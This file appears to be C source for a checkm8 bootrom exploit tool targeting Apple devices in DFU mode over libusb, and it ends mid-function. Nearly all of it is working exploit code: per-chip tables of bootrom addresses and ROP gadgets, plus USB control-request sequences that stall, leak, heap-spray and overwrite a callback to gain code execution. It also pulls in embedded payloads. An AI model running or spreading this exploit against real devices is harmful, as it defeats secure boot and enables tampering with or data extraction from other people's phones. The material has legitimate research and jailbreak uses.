/* Copyright 2023 0x7ff
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
#define HAVE_LIBUSB 1
#include <libusb-1.0/libusb.h>
#if defined(_WIN32)
#include <windows.h>
#include <timeapi.h>
#endif
#include <stdbool.h>
#include <stdint.h>
#include <stddef.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <time.h>
#include <inttypes.h>

#define DFU_DNLOAD (1)
#define AES_CMD_DEC (1U)
#define APPLE_VID (0x5AC)
#define AES_CMD_CBC (16U)
#define AES_BLOCK_SZ (16)
#define DFU_STATUS_OK (0)
#define DFU_GET_STATUS (3)
#define DFU_CLR_STATUS (4)
#define MAX_BLOCK_SZ (0x50)
#define DFU_MODE_PID (0x1227)
#define DFU_STATE_MANIFEST (7)
#define EP0_MAX_PACKET_SZ (0x40)
#define DFU_FILE_SUFFIX_LEN (16)
#define AES_KEY_SZ_BYTES_256 (32)
#define AES_KEY_TYPE_GID0 (0x200U)
#define DFU_MAX_TRANSFER_SZ (0x800)
#define DFU_STATE_MANIFEST_SYNC (6)
#define AES_KEY_SZ_256 (0x20000000U)
#define ARM_16K_TT_L2_SZ (0x2000000U)
#define DFU_STATE_MANIFEST_WAIT_RESET (8)
#define DONE_MAGIC (0x646F6E65646F6E65ULL)
#define EXEC_MAGIC (0x6578656365786563ULL)
#define MEMC_MAGIC (0x6D656D636D656D63ULL)
#define USB_MAX_STRING_DESCRIPTOR_IDX (10)

#define LZSS_F (18)
#define LZSS_N (4096)
#define DER_INT (0x2U)
#define DER_SEQ (0x30U)
#define LZSS_THRESHOLD (2)
#define DER_IA5_STR (0x16U)
#define DER_OCTET_STR (0x4U)
#define COMP_HDR_PAD_SZ (0x16C)
#define COMP_HDR_MAGIC (0x636F6D70U)
#define DER_FLAG_OPTIONAL (1U << 0U)
#define COMP_HDR_TYPE_LZSS (0x6C7A7373U)

#ifndef HAVE_LIBUSB
#	if TARGET_OS_IPHONE
#		define kUSBPipeStalled kUSBHostReturnPipeStalled
#	else
#		define kUSBPipeStalled kIOUSBPipeStalled
#	endif
#endif

#ifndef MIN
#	define MIN(a, b) ((a) < (b) ? (a) : (b))
#endif

typedef struct {
	uint64_t func, arg;
} callback_t;

typedef struct {
	const uint8_t *buf;
	size_t len;
} der_item_t;

typedef struct {
	uint8_t off, tag, flags;
} der_item_spec_t;

typedef struct {
	uint32_t endpoint, pad_0;
	uint64_t io_buffer;
	uint32_t status, io_len, ret_cnt, pad_1;
	uint64_t callback, next;
} dfu_callback_t;

typedef struct {
	uint32_t endpoint, io_buffer, status, io_len, ret_cnt, callback, next;
} dfu_callback_armv7_t;

typedef struct {
	der_item_t magic, type, vers, data, kbag, comp;
} im4p_t;

typedef struct {
	der_item_t magic;
	im4p_t im4p;
} img4_t;

typedef struct {
	dfu_callback_t callback;
} checkm8_overwrite_t;

typedef struct {
	dfu_callback_armv7_t callback;
} checkm8_overwrite_armv7_t;

typedef struct {
	uint16_t vid, pid;
#ifdef HAVE_LIBUSB
	struct libusb_device_handle *device;
#else
	io_service_t serv;
	IOUSBDeviceInterface320 **device;
	CFRunLoopSourceRef async_event_source;
#endif
} usb_handle_t;

typedef bool (*usb_check_cb_t)(usb_handle_t *, void *);

enum usb_transfer {
	USB_TRANSFER_OK,
	USB_TRANSFER_ERROR,
	USB_TRANSFER_STALL
};

typedef struct {
	enum usb_transfer ret;
	uint32_t sz;
} transfer_ret_t;

extern uint8_t payload_A9_bin[], payload_notA9_bin[], payload_notA9_armv7_bin[], payload_handle_checkm8_request_bin[], payload_handle_checkm8_request_armv7_bin[];
extern unsigned payload_A9_bin_len, payload_notA9_bin_len, payload_notA9_armv7_bin_len, payload_handle_checkm8_request_bin_len, payload_handle_checkm8_request_armv7_bin_len;

#include "payload_A9.h"
#include "payload_notA9.h"
#include "payload_notA9_armv7.h"
#include "payload_handle_checkm8_request.h"
#include "payload_handle_checkm8_request_armv7.h"

static uint16_t cpid;
static uint32_t payload_dest_armv7;
static const char *pwnd_str = " PWND:[checkm8]";
static der_item_spec_t der_img4_item_specs[] = {
	{ 0, DER_IA5_STR, 0 },
	{ 1, DER_SEQ, 0 }
}, der_im4p_item_specs[] = {
	{ 0, DER_IA5_STR, 0 },
	{ 1, DER_IA5_STR, 0 },
	{ 2, DER_IA5_STR, 0 },
	{ 3, DER_OCTET_STR, 0 },
	{ 4, DER_OCTET_STR, DER_FLAG_OPTIONAL },
	{ 5, DER_SEQ, DER_FLAG_OPTIONAL }
};
static unsigned usb_timeout, usb_abort_timeout_min;
static struct {
	uint8_t b_len, b_descriptor_type;
	uint16_t bcd_usb;
	uint8_t b_device_class, b_device_sub_class, b_device_protocol, b_max_packet_sz;
	uint16_t id_vendor, id_product, bcd_device;
	uint8_t i_manufacturer, i_product, i_serial_number, b_num_configurations;
} device_descriptor;
static size_t config_hole, ttbr0_vrom_off, ttbr0_sram_off, config_large_leak, config_overwrite_pad;
static uint64_t tlbi, nop_gadget, ret_gadget, patch_addr, ttbr0_addr, func_gadget, write_ttbr0, memcpy_addr, aes_crypto_cmd, boot_tramp_end, gUSBSerialNumber, dfu_handle_request, usb_core_do_transfer, dfu_handle_bus_reset, insecure_memory_base, handle_interface_request, usb_create_string_descriptor, usb_serial_number_string_descriptor;

static void
sleep_ms(unsigned ms) {
#ifdef WIN32
	Sleep(ms);
#else
	struct timespec ts;

	ts.tv_sec = ms / 1000;
	ts.tv_nsec = (ms % 1000) * 1000000L;
	nanosleep(&ts, NULL);
#endif
}

#ifdef HAVE_LIBUSB
static void
close_usb_handle(usb_handle_t *handle) {
#if defined(_WIN32)
	libusb_release_interface(handle->device, 0);
#endif
	libusb_close(handle->device);
	libusb_exit(NULL);
}

static void
reset_usb_handle(const usb_handle_t *handle) {
	libusb_reset_device(handle->device);
}

static bool
wait_usb_handle(usb_handle_t *handle, usb_check_cb_t usb_check_cb, void *arg) {
	if(libusb_init(NULL) == LIBUSB_SUCCESS) {
		printf("[libusb] Waiting for the USB handle with VID: 0x%" PRIX16 ", PID: 0x%" PRIX16 "\n", handle->vid, handle->pid);
		for(;;) {
			if((handle->device = libusb_open_device_with_vid_pid(NULL, handle->vid, handle->pid)) != NULL) {
#if defined(_WIN32)
				/* On Windows (WinUSB/libusbK) EP0 control transfers are only
				 * routed once an interface is claimed; without this every
				 * control request times out (LIBUSB_ERROR_TIMEOUT) and the
				 * device is never recognised. Linux/macOS do not need this, so
				 * it is Windows-only to leave those paths unchanged. */
				if(libusb_claim_interface(handle->device, 0) != LIBUSB_SUCCESS) {
					libusb_close(handle->device);
					sleep_ms(usb_timeout);
					continue;
				}
#endif
				/* Do NOT call libusb_set_configuration() here. The device is
				 * already in configuration 1, and the Apple DFU USB stack does
				 * not answer a redundant SET_CONFIGURATION request: on Linux the
				 * call blocks for ~5s and then fails with ETIMEDOUT (errno 110),
				 * which stalls every acquire attempt. EP0 control transfers work
				 * without it (as ipwndfu/pyusb do). */
				if(usb_check_cb == NULL || usb_check_cb(handle, arg)) {
					puts("Found the USB handle.");
					return true;
				}
#if defined(_WIN32)
				libusb_release_interface(handle->device, 0);
#endif
				libusb_close(handle->device);
			}
			sleep_ms(usb_timeout);
		}
	}
	return false;
}

static void
usb_async_cb(struct libusb_transfer *transfer) {
	*(int *)transfer->user_data = 1;
}

static bool
send_usb_control_request(const usb_handle_t *handle, uint8_t bm_request_type, uint8_t b_request, uint16_t w_value, uint16_t w_index, void *p_data, size_t w_len, transfer_ret_t *transfer_ret) {
	int ret = libusb_control_transfer(handle->device, bm_request_type, b_request, w_value, w_index, p_data, (uint16_t)w_len, usb_timeout);

	if(transfer_ret != NULL) {
		if(ret >= 0) {
			transfer_ret->sz = (uint32_t)ret;
			transfer_ret->ret = USB_TRANSFER_OK;
		} else if(ret == LIBUSB_ERROR_PIPE) {
			transfer_ret->ret = USB_TRANSFER_STALL;
		} else {
			transfer_ret->ret = USB_TRANSFER_ERROR;
		}
	}
	return true;
}

static bool
send_usb_control_request_async(const usb_handle_t *handle, uint8_t bm_request_type, uint8_t b_request, uint16_t w_value, uint16_t w_index, void *p_data, size_t w_len, unsigned usb_abort_timeout, transfer_ret_t *transfer_ret) {
	struct libusb_transfer *transfer = libusb_alloc_transfer(0);
	struct timeval tv;
	int completed = 0;
	uint8_t *buf;

	if(transfer != NULL) {
		if((buf = malloc(LIBUSB_CONTROL_SETUP_SIZE + w_len)) != NULL) {
			if((bm_request_type & LIBUSB_ENDPOINT_DIR_MASK) == LIBUSB_ENDPOINT_OUT) {
				memcpy(buf + LIBUSB_CONTROL_SETUP_SIZE, p_data, w_len);
			}
			libusb_fill_control_setup(buf, bm_request_type, b_request, w_value, w_index, (uint16_t)w_len);
			libusb_fill_control_transfer(transfer, handle->device, buf, usb_async_cb, &completed, usb_timeout);
			if(libusb_submit_transfer(transfer) == LIBUSB_SUCCESS) {
				tv.tv_sec = usb_abort_timeout / 1000;
				tv.tv_usec = (usb_abort_timeout % 1000) * 1000;
				while(completed == 0 && libusb_handle_events_timeout_completed(NULL, &tv, &completed) == LIBUSB_SUCCESS) {
					libusb_cancel_transfer(transfer);
				}
				if(completed != 0) {
					if((bm_request_type & LIBUSB_ENDPOINT_DIR_MASK) == LIBUSB_ENDPOINT_IN) {
						memcpy(p_data, libusb_control_transfer_get_data(transfer), transfer->actual_length);
					}
					if(transfer_ret != NULL) {
						transfer_ret->sz = (uint32_t)transfer->actual_length;
						if(transfer->status == LIBUSB_TRANSFER_COMPLETED) {
							transfer_ret->ret = USB_TRANSFER_OK;
						} else if(transfer->status == LIBUSB_TRANSFER_STALL) {
							transfer_ret->ret = USB_TRANSFER_STALL;
						} else {
							transfer_ret->ret = USB_TRANSFER_ERROR;
						}
					}
				}
			}
			free(buf);
		}
		libusb_free_transfer(transfer);
	}
	return completed != 0;
}

static void
init_usb_handle(usb_handle_t *handle, uint16_t vid, uint16_t pid) {
	handle->vid = vid;
	handle->pid = pid;
	handle->device = NULL;
}
#endif

static bool
send_usb_control_request_no_data(const usb_handle_t *handle, uint8_t bm_request_type, uint8_t b_request, uint16_t w_value, uint16_t w_index, size_t w_len, transfer_ret_t *transfer_ret) {
	bool ret = false;
	void *p_data;

	if(w_len == 0) {
		ret = send_usb_control_request(handle, bm_request_type, b_request, w_value, w_index, NULL, 0, transfer_ret);
	} else if((p_data = malloc(w_len)) != NULL) {
		memset(p_data, '\0', w_len);
		ret = send_usb_control_request(handle, bm_request_type, b_request, w_value, w_index, p_data, w_len, transfer_ret);
		free(p_data);
	}
	return ret;
}

static bool
send_usb_control_request_async_no_data(const usb_handle_t *handle, uint8_t bm_request_type, uint8_t b_request, uint16_t w_value, uint16_t w_index, size_t w_len, unsigned usb_abort_timeout, transfer_ret_t *transfer_ret) {
	bool ret = false;
	void *p_data;

	if(w_len == 0) {
		ret = send_usb_control_request_async(handle, bm_request_type, b_request, w_value, w_index, NULL, 0, usb_abort_timeout, transfer_ret);
	} else if((p_data = malloc(w_len)) != NULL) {
		memset(p_data, '\0', w_len);
		ret = send_usb_control_request_async(handle, bm_request_type, b_request, w_value, w_index, p_data, w_len, usb_abort_timeout, transfer_ret);
		free(p_data);
	}
	return ret;
}

static char *
get_usb_serial_number(usb_handle_t *handle) {
	transfer_ret_t transfer_ret;
	uint8_t buf[UINT8_MAX];
	char *str = NULL;
	size_t i, sz;

	if(send_usb_control_request(handle, 0x80, 6, 1U << 8U, 0, &device_descriptor, sizeof(device_descriptor), &transfer_ret) && transfer_ret.ret == USB_TRANSFER_OK && transfer_ret.sz == sizeof(device_descriptor) && send_usb_control_request(handle, 0x80, 6, (3U << 8U) | device_descriptor.i_serial_number, 0x409, buf, sizeof(buf), &transfer_ret) && transfer_ret.ret == USB_TRANSFER_OK && transfer_ret.sz == buf[0] && (sz = buf[0] / 2) != 0 && (str = malloc(sz)) != NULL) {
		for(i = 0; i < sz; ++i) {
			str[i] = (char)buf[2 * (i + 1)];
		}
		str[sz - 1] = '\0';
	}
	return str;
}

static bool
checkm8_check_usb_device(usb_handle_t *handle, void *pwned) {
	char *usb_serial_num = get_usb_serial_number(handle);
	bool ret = false;

	if(usb_serial_num != NULL) {
		if(strstr(usb_serial_num, " SRTG:[iBoot-1145.3]") != NULL) {
			cpid = 0x8950;
			config_large_leak = 659;
			config_overwrite_pad = 0x640;
			memcpy_addr = 0x9ACC;
			aes_crypto_cmd = 0x7301;
			gUSBSerialNumber = 0x10061F80;
			dfu_handle_request = 0x10061A24;
			payload_dest_armv7 = 0x10079800;
			usb_core_do_transfer = 0x7621;
			dfu_handle_bus_reset = 0x10061A3C;
			insecure_memory_base = 0x10000000;
			handle_interface_request = 0x8161;
			usb_create_string_descriptor = 0x7C55;
			usb_serial_number_string_descriptor = 0x100600D8;
		} else if(strstr(usb_serial_num, " SRTG:[iBoot-1145.3.3]") != NULL) {
			cpid = 0x8955;
			config_large_leak = 659;
			config_overwrite_pad = 0x640;
			memcpy_addr = 0x9B0C;
			aes_crypto_cmd = 0x7341;
			gUSBSerialNumber = 0x10061F80;
			dfu_handle_request = 0x10061A24;
			payload_dest_armv7 = 0x10079800;
			usb_core_do_transfer = 0x7661;
			dfu_handle_bus_reset = 0x10061A3C;
			insecure_memory_base = 0x10000000;
			handle_interface_request = 0x81A1;
			usb_create_string_descriptor = 0x7C95;
			usb_serial_number_string_descriptor = 0x100600D8;
		} else if(strstr(usb_serial_num, " SRTG:[iBoot-1458.2]") != NULL) {
			cpid = 0x8947;
			config_large_leak = 626;
			config_overwrite_pad = 0x660;
			memcpy_addr = 0x9A3C;
			aes_crypto_cmd = 0x7061;
			gUSBSerialNumber = 0x3402DDF8;
			dfu_handle_request = 0x3402D92C;
			payload_dest_armv7 = 0x34039800;
			usb_core_do_transfer = 0x79ED;
			dfu_handle_bus_reset = 0x3402D944;
			insecure_memory_base = 0x34000000;
			handle_interface_request = 0x7BC9;
			usb_create_string_descriptor = 0x72A9;
			usb_serial_number_string_descriptor = 0x3402C2DA;
		} else if(strstr(usb_serial_num, " SRTG:[iBoot-1704.10]") != NULL) {
			cpid = 0x8960;
			config_large_leak = 7936;
			config_overwrite_pad = 0x5C0;
			patch_addr = 0x100005CE0;
			memcpy_addr = 0x10000ED50;
			aes_crypto_cmd = 0x10000B9A8;
			boot_tramp_end = 0x1800E1000;
			gUSBSerialNumber = 0x180086CDC;
			dfu_handle_request = 0x180086C70;
			usb_core_do_transfer = 0x10000CC78;
			dfu_handle_bus_reset = 0x180086CA0;
			insecure_memory_base = 0x180380000;
			handle_interface_request = 0x10000CFB4;
			usb_create_string_descriptor = 0x10000BFEC;
			usb_serial_number_string_descriptor = 0x180080562;
		} else if(strstr(usb_serial_num, " SRTG:[iBoot-1991.0.0.2.16]") != NULL) {
			cpid = 0x7001;
			config_overwrite_pad = 0x500;
			patch_addr = 0x10000AD04;
			memcpy_addr = 0x100013F10;
			aes_crypto_cmd = 0x100010A90;
			boot_tramp_end = 0x1800E1000;
			gUSBSerialNumber = 0x180088E48;
			dfu_handle_request = 0x180088DF8;
			usb_core_do_transfer = 0x100011BB4;
			dfu_handle_bus_reset = 0x180088E18;
			insecure_memory_base = 0x180380000;
			handle_interface_request = 0x100011EE4;
			usb_create_string_descriptor = 0x100011074;
			usb_serial_number_string_descriptor = 0x180080C2A;
		} else if(strstr(usb_serial_num, " SRTG:[iBoot-1992.0.0.1.19]") != NULL) {
			cpid = 0x7000;
			config_overwrite_pad = 0x500;
			patch_addr = 0x100007E98;
			memcpy_addr = 0x100010E70;
			aes_crypto_cmd = 0x10000DA90;
			boot_tramp_end = 0x1800E1000;
			gUSBSerialNumber = 0x1800888C8;
			dfu_handle_request = 0x180088878;
			usb_core_do_transfer = 0x10000EBB4;
			dfu_handle_bus_reset = 0x180088898;
			insecure_memory_base = 0x180380000;
			handle_interface_request = 0x10000EEE4;
			usb_create_string_descriptor = 0x10000E074;
			usb_serial_number_string_descriptor = 0x18008062A;
		} else if(strstr(usb_serial_num, " SRTG:[iBoot-2098.0.0.2.4]") != NULL) {
			cpid = 0x7002;
			config_overwrite_pad = 0x500;
			memcpy_addr = 0x89F4;
			aes_crypto_cmd = 0x6341;
			gUSBSerialNumber = 0x46005958;
			dfu_handle_request = 0x46005898;
			payload_dest_armv7 = 0x46007800;
			usb_core_do_transfer = 0x6E59;
			dfu_handle_bus_reset = 0x460058B0;
			insecure_memory_base = 0x46018000;
			handle_interface_request = 0x7081;
			usb_create_string_descriptor = 0x6745;
			usb_serial_number_string_descriptor = 0x4600034A;
		} else if(strstr(usb_serial_num, " SRTG:[iBoot-2234.0.0.2.22]") != NULL) {
			cpid = 0x8003;
			config_overwrite_pad = 0x500;
			patch_addr = 0x10000812C;
			ttbr0_addr = 0x1800C8000;
			memcpy_addr = 0x100011030;
			aes_crypto_cmd = 0x10000DAA0;
			ttbr0_vrom_off = 0x400;
			boot_tramp_end = 0x1800E1000;
			gUSBSerialNumber = 0x180087958;
			dfu_handle_request = 0x1800878F8;
			usb_core_do_transfer = 0x10000EE78;
			dfu_handle_bus_reset = 0x180087928;
			insecure_memory_base = 0x180380000;
			handle_interface_request = 0x10000F1B0;
			usb_create_string_descriptor = 0x10000E354;
			usb_serial_number_string_descriptor = 0x1800807DA;
		} else if(strstr(usb_serial_num, " SRTG:[iBoot-2234.0.0.3.3]") != NULL) {
			cpid = 0x8000;
			config_overwrite_pad = 0x500;
			patch_addr = 0x10000812C;
			ttbr0_addr = 0x1800C8000;
			memcpy_addr = 0x100011030;
			aes_crypto_cmd = 0x10000DAA0;
			ttbr0_vrom_off = 0x400;
			boot_tramp_end = 0x1800E1000;
			gUSBSerialNumber = 0x180087958;
			dfu_handle_request = 0x1800878F8;
			usb_core_do_transfer = 0x10000EE78;
			dfu_handle_bus_reset = 0x180087928;
			insecure_memory_base = 0x180380000;
			handle_interface_request = 0x10000F1B0;
			usb_create_string_descriptor = 0x10000E354;
			usb_serial_number_string_descriptor = 0x1800807DA;
		} else if(strstr(usb_serial_num, " SRTG:[iBoot-2481.0.0.2.1]") != NULL) {
			cpid = 0x8001;
			config_hole = 6;
			config_overwrite_pad = 0x5C0;
			tlbi = 0x100000404;
			nop_gadget = 0x10000CD60;
			ret_gadget = 0x100000118;
			patch_addr = 0x100007668;
			ttbr0_addr = 0x180050000;
			func_gadget = 0x10000CD40;
			write_ttbr0 = 0x1000003B4;
			memcpy_addr = 0x1000106F0;
			aes_crypto_cmd = 0x10000C9D4;
			boot_tramp_end = 0x180044000;
			ttbr0_vrom_off = 0x400;
			ttbr0_sram_off = 0x600;
			gUSBSerialNumber = 0x180047578;
			dfu_handle_request = 0x18004C378;
			usb_core_do_transfer = 0x10000DDA4;
			dfu_handle_bus_reset = 0x18004C3A8;
			insecure_memory_base = 0x180000000;
			handle_interface_request = 0x10000E0B4;
			usb_create_string_descriptor = 0x10000D280;
			usb_serial_number_string_descriptor = 0x18004486A;
		} else if(strstr(usb_serial_num, " SRTG:[iBoot-2651.0.0.1.31]") != NULL) {
			cpid = 0x8002;
			config_hole = 5;
			config_overwrite_pad = 0x5C0;
			memcpy_addr = 0xB6F8;
			aes_crypto_cmd = 0x86DD;
			gUSBSerialNumber = 0x48802AB8;
			dfu_handle_request = 0x48806344;
			payload_dest_armv7 = 0x48806E00;
			usb_core_do_transfer = 0x9411;
			dfu_handle_bus_reset = 0x4880635C;
			insecure_memory_base = 0x48818000;
			handle_interface_request = 0x95F1;
			usb_create_string_descriptor = 0x8CA5;
			usb_serial_number_string_descriptor = 0x4880037A;
		} else if(strstr(usb_serial_num, " SRTG:[iBoot-2651.0.0.3.3]") != NULL) {
			cpid = 0x8004;
			config_hole = 5;
			config_overwrite_pad = 0x5C0;
			memcpy_addr = 0xA884;
			aes_crypto_cmd = 0x786D;
			gUSBSerialNumber = 0x48802AE8;
			dfu_handle_request = 0x48806384;
			payload_dest_armv7 = 0x48806E00;
			usb_core_do_transfer = 0x85A1;
			dfu_handle_bus_reset = 0x4880639C;
			insecure_memory_base = 0x48818000;
			handle_interface_request = 0x877D;
			usb_create_string_descriptor = 0x7E35;
			usb_serial_number_string_descriptor = 0x488003CA;
		} else if(strstr(usb_serial_num, " SRTG:[iBoot-2696.0.0.1.33]") != NULL) {
			cpid = 0x8010;
			config_hole = 5;
			config_overwrite_pad = 0x5C0;
			tlbi = 0x100000434;
			nop_gadget = 0x10000CC6C;
			ret_gadget = 0x10000015C;
			patch_addr = 0x1000074AC;
			ttbr0_addr = 0x1800A0000;
			func_gadget = 0x10000CC4C;
			write_ttbr0 = 0x1000003E4;
			memcpy_addr = 0x100010730;
			aes_crypto_cmd = 0x10000C8F4;
			boot_tramp_end = 0x1800B0000;
			ttbr0_vrom_off = 0x400;
			ttbr0_sram_off = 0x600;
			gUSBSerialNumber = 0x180083CF8;
			dfu_handle_request = 0x180088B48;
			usb_core_do_transfer = 0x10000DC98;
			dfu_handle_bus_reset = 0x180088B78;
			insecure_memory_base = 0x1800B0000;
			handle_interface_request = 0x10000DFB8;
			usb_create_string_descriptor = 0x10000D150;
			usb_serial_number_string_descriptor = 0x1800805DA;
		} else if(strstr(usb_serial_num, " SRTG:[iBoot-3135.0.0.2.3]") != NULL) {
			cpid = 0x8011;
			config_hole = 6;
			config_overwrite_pad = 0x540;
			tlbi = 0x100000444;
			nop_gadget = 0x10000CD0C;
			ret_gadget = 0x100000148;
			patch_addr = 0x100007630;
			ttbr0_addr = 0x1800A0000;
			func_gadget = 0x10000CCEC;
			write_ttbr0 = 0x1000003F4;
			memcpy_addr = 0x100010950;
			aes_crypto_cmd = 0x10000C994;
			boot_tramp_end = 0x1800B0000;
			ttbr0_vrom_off = 0x400;
			ttbr0_sram_off = 0x600;
			gUSBSerialNumber = 0x180083D28;
			dfu_handle_request = 0x180088A58;
			usb_core_do_transfer = 0x10000DD64;
			dfu_handle_bus_reset = 0x180088A88;
			insecure_memory_base = 0x1800B0000;
			handle_interface_request = 0x10000E08C;
			usb_create_string_descriptor = 0x10000D234;
			usb_serial_number_string_descriptor = 0x18008062A;
		} else if(strstr(usb_serial_num, " SRTG:[iBoot-3332.0.0.1.23]") != NULL) {
			cpid = 0x8015;
			config_hole = 6;
			config_overwrite_pad = 0x540;
			tlbi = 0x1000004AC;
			nop_gadget = 0x10000A9C4;
			ret_gadget = 0x100000148;
			patch_addr = 0x10000624C;
			ttbr0_addr = 0x18000C000;
			func_gadget = 0x10000A9AC;
			write_ttbr0 = 0x10000045C;
			memcpy_addr = 0x10000E9D0;
			aes_crypto_cmd = 0x100009E9C;
			boot_tramp_end = 0x18001C000;
			ttbr0_vrom_off = 0x400;
			ttbr0_sram_off = 0x600;
			gUSBSerialNumber = 0x180003A78;
			dfu_handle_request = 0x180008638;
			usb_core_do_transfer = 0x10000B9A8;
			dfu_handle_bus_reset = 0x180008668;
			insecure_memory_base = 0x18001C000;
			handle_interface_request = 0x10000BCCC;
			usb_create_string_descriptor = 0x10000AE80;
			usb_serial_number_string_descriptor = 0x1800008FA;
		} else if(strstr(usb_serial_num, " SRTG:[iBoot-3401.0.0.1.16]") != NULL) {
			cpid = 0x8012;
			config_hole = 6;
			config_overwrite_pad = 0x540;
			tlbi = 0x100000494;
			nop_gadget = 0x100008DB8;
			ret_gadget = 0x10000012C;
			patch_addr = 0x100004854;
			ttbr0_addr = 0x18000C000;
			func_gadget = 0x100008DA0;
			write_ttbr0 = 0x100000444;
			memcpy_addr = 0x10000EA30;
			aes_crypto_cmd = 0x1000082AC;
			boot_tramp_end = 0x18001C000;
			ttbr0_vrom_off = 0x400;
			ttbr0_sram_off = 0x600;
			gUSBSerialNumber = 0x180003AF8;
			dfu_handle_request = 0x180008B08;
			usb_core_do_transfer = 0x10000BD20;
			dfu_handle_bus_reset = 0x180008B38;
			insecure_memory_base = 0x18001C000;
			handle_interface_request = 0x10000BFFC;
			usb_create_string_descriptor = 0x10000B1CC;
			usb_serial_number_string_descriptor = 0x18000082A;
		}
		if(cpid != 0) {
			printf("CPID: 0x%" PRIX32 "\n", cpid);
			*(bool *)pwned = strstr(usb_serial_num, pwnd_str) != NULL;
			ret = true;
		}
		free(usb_serial_num);
	}
	return ret;
}

static bool
dfu_check_status(const usb_handle_t *handle, uint8_t status, uint8_t state) {
	struct {
		uint8_t status, poll_timeout[3], state, str_idx;
	} dfu_status;
	transfer_ret_t transfer_ret;

	return send_usb_control_request(handle, 0xA1, DFU_GET_STATUS, 0, 0, &dfu_status, sizeof(dfu_status), &transfer_ret) && transfer_ret.ret == USB_TRANSFER_OK && transfer_ret.sz == sizeof(dfu_status) && dfu_status.status == status && dfu_status.state == state;
}

static bool
dfu_set_state_wait_reset(const usb_handle_t *handle) {
	transfer_ret_t transfer_ret;

	return send_usb_control_request_no_data(handle, 0x21, DFU_DNLOAD, 0, 0, 0, &transfer_ret) && transfer_ret.ret == USB_TRANSFER_OK && transfer_ret.sz == 0 && dfu_check_status(handle, DFU_STATUS_OK, DFU_STATE_MANIFEST_SYNC) && dfu_check_status(handle, DFU_STATUS_OK, DFU_STATE_MANIFEST) && dfu_check_status(handle, DFU_STATUS_OK, DFU_STATE_MANIFEST_WAIT_RESET);
}

static bool
checkm8_stage_reset(const usb_handle_t *handle) {
	transfer_ret_t transfer_ret;

	if(send_usb_control_request_no_data(handle, 0x21, DFU_DNLOAD, 0, 0, DFU_FILE_SUFFIX_LEN, &transfer_ret) && transfer_ret.ret == USB_TRANSFER_OK && transfer_ret.sz == DFU_FILE_SUFFIX_LEN && dfu_set_state_wait_reset(handle) && send_usb_control_request_no_data(handle, 0x21, DFU_DNLOAD, 0, 0, EP0_MAX_PACKET_SZ, &transfer_ret) && transfer_ret.ret == USB_TRANSFER_OK && transfer_ret.sz == EP0_MAX_PACKET_SZ) {
		return true;
	}
	send_usb_control_request_no_data(handle, 0x21, DFU_CLR_STATUS, 0, 0, 0, NULL);
	return false;
}

static bool
checkm8_stage_setup(const usb_handle_t *handle) {
	unsigned usb_abort_timeout = usb_timeout - 1;
	transfer_ret_t transfer_ret;

	for(;;) {
		if(send_usb_control_request_async_no_data(handle, 0x21, DFU_DNLOAD, 0, 0, DFU_MAX_TRANSFER_SZ, usb_abort_timeout, &transfer_ret) && transfer_ret.sz < config_overwrite_pad && send_usb_control_request_no_data(handle, 0, 0, 0, 0, config_overwrite_pad - transfer_ret.sz, &transfer_ret) && transfer_ret.ret == USB_TRANSFER_STALL) {
			return true;
		}
		send_usb_control_request_no_data(handle, 0x21, DFU_DNLOAD, 0, 0, EP0_MAX_PACKET_SZ, NULL);
		usb_abort_timeout = (usb_abort_timeout + 1) % (usb_timeout - usb_abort_timeout_min + 1) + usb_abort_timeout_min;
	}
	return false;
}

static bool
checkm8_usb_request_leak(const usb_handle_t *handle) {
	transfer_ret_t transfer_ret;

	return send_usb_control_request_async_no_data(handle, 0x80, 6, (3U << 8U) | device_descriptor.i_serial_number, USB_MAX_STRING_DESCRIPTOR_IDX, EP0_MAX_PACKET_SZ, 1, &transfer_ret) && transfer_ret.sz == 0;
}

static void
checkm8_stall(const usb_handle_t *handle) {
	unsigned usb_abort_timeout = usb_timeout - 1;
	transfer_ret_t transfer_ret;

	for(;;) {
		if(send_usb_control_request_async_no_data(handle, 0x80, 6, (3U << 8U) | device_descriptor.i_serial_number, USB_MAX_STRING_DESCRIPTOR_IDX, 3 * EP0_MAX_PACKET_SZ, usb_abort_timeout, &transfer_ret) && transfer_ret.sz < 3 * EP0_MAX_PACKET_SZ && checkm8_usb_request_leak(handle)) {
			break;
		}
		usb_abort_timeout = (usb_abort_timeout + 1) % (usb_timeout - usb_abort_timeout_min + 1) + usb_abort_timeout_min;
	}
}

static bool
checkm8_no_leak(const usb_handle_t *handle) {
	transfer_ret_t transfer_ret;

	return send_usb_control_request_async_no_data(handle, 0x80, 6, (3U << 8U) | device_descriptor.i_serial_number, USB_MAX_STRING_DESCRIPTOR_IDX, 3 * EP0_MAX_PACKET_SZ + 1, 1, &transfer_ret) && transfer_ret.sz == 0;
}

static bool
checkm8_usb_request_stall(const usb_handle_t *handle) {
	transfer_ret_t transfer_ret;

	return send_usb_control_request_no_data(handle, 2, 3, 0, 0x80, 0, &transfer_ret) && transfer_ret.ret == USB_TRANSFER_STALL;
}

static bool
checkm8_stage_spray(const usb_handle_t *handle) {
	size_t i;

	if(config_large_leak == 0) {
		if(cpid == 0x7001 || cpid == 0x7000 || cpid == 0x7002 || cpid == 0x8003 || cpid == 0x8000) {
			while(!checkm8_usb_request_stall(handle) || !checkm8_usb_request_leak(handle) || !checkm8_no_leak(handle)) {}
		} else {
			checkm8_stall(handle);
			for(i = 0; i < config_hole; ++i) {
				while(!checkm8_no_leak(handle)) {}
			}
			while(!checkm8_usb_request_leak(handle) || !checkm8_no_leak(handle)) {}
		}
		send_usb_control_request_no_data(handle, 0x21, DFU_CLR_STATUS, 0, 0, 3 * EP0_MAX_PACKET_SZ + 1, NULL);
	} else {
		for(i = 0; i < config_large_leak; ++i) {
			while(!checkm8_usb_request_stall(handle)) {}
		}
		send_usb_control_request_no_data(handle, 0x21, DFU_CLR_STATUS, 0, 0, 0, NULL);
	}
	return true;
}

static size_t
usb_rop_callbacks(uint8_t *buf, uint64_t addr, const callback_t *callbacks, size_t callback_cnt) {
	uint8_t block_0[MAX_BLOCK_SZ], block_1[MAX_BLOCK_SZ];
	size_t i, j, sz = 0, block_0_sz, block_1_sz;
	uint64_t reg;

